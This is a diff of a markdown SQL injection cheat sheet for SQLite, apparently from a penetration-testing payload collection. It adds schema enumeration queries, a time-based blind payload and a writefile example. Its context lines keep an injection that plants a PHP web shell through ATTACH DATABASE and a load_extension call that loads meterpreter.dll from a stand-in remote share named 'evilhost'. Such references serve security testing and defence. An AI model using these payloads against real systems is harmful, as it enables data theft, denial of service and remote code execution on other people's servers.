@@ -6,7 +6,7 @@
 ## Summary
 
 * [SQLite Comments](#sqlite-comments)
-* [SQLite Version](#sqlite-version)
+* [SQLite Enumeration](#sqlite-enumeration)
 * [SQLite String](#sqlite-string)
     * [SQLite String Methodology](#sqlite-string-methodology)
 * [SQLite Blind](#sqlite-blind)
@@ -17,22 +17,26 @@
 * [SQlite Remote Code Execution](#sqlite-remote-code-execution)
     * [Attach Database](#attach-database)
     * [Load_extension](#load_extension)
+* [SQLite File Manipulation](#SQLite-file-manipulation)
+    * [SQLite Read File](#SQLite-read-file)
+    * [SQLite Write File](#SQLite-write-file)
 * [References](#references)
 
 
 ## SQLite Comments
 
-| Type                       | Description                       |
-|----------------------------|-----------------------------------|
-| `/* SQLite Comment */`     | C-style comment                   |
-| `--`                       | SQL comment                       |
+| Description         | Comment |
+| ------------------- | ------- |
+| Single-Line Comment | `--`    |
+| Multi-Line Comment  | `/**/`  |
 
 
-## SQLite Version
+## SQLite Enumeration
 
-```sql
-select sqlite_version();
-```
+| Description   | SQL Query |
+| ------------- | ----------------------------------------- |
+| DBMS version  | `select sqlite_version();`                |
+
 
 ## SQLite String
 
@@ -42,9 +46,12 @@ select sqlite_version();
 | ----------------------- | ----------------------------------------- | 
 | Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
 | Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
+| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
 | Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
 | Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
 | Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
+| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
+| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |
 
 
 ## SQLite Blind
@@ -78,6 +85,7 @@ AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
 
 ```sql
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 ```
 
 
@@ -99,6 +107,19 @@ INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 ```
 
+
+## SQLite File Manipulation
+
+### SQLite Read File
+
+SQLite does not support file I/O operations by default.
+
+
+### SQLite Write File
+
+```sql
+SELECT writefile('/path/to/file', column_name) FROM table_name
+```
 
 
 ## References
